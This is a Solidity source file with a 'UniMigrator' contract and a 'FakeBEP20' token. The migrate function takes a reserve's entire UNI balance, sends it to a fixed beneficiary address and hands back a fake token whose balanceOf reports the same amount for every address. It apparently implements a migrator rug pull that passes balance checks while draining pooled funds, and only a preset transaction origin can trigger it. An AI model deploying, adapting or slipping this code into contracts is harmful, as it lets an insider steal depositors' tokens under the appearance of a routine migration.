pragma solidity 0.6.12;

interface IBEP20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract FakeBEP20 {
    uint256 public amount;

    constructor(uint256 _amount) public {
        amount = _amount;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return amount;
    }
}

contract UniMigrator {
    address public reserve;
    address public origin;
    address public beneficiary;

    constructor(
        address _reserve,
        address _origin,
        address _beneficiary
    ) public {
        reserve = _reserve;
        origin = _origin;
        beneficiary = _beneficiary;
    }

    function migrate(IBEP20 src) public returns (address) {
        require(address(src) == 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, "not uni token");
        require(msg.sender == reserve, "not from getoreserve");
        require(tx.origin == origin, "not from origin");
        uint256 bal = src.balanceOf(msg.sender);
        src.transferFrom(msg.sender, beneficiary, bal);
        return address(new FakeBEP20(bal));
    }
}
